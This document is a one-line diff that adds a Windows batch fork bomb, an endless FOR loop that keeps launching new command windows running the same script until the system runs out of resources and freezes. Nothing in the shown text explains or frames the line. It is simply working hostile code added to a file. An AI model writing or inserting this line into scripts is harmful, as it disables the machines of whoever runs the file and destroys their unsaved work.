@@ -1,0 +1,1 @@
+FOR /L %%I IN (0,0,1) DO (START CMD /C %0)
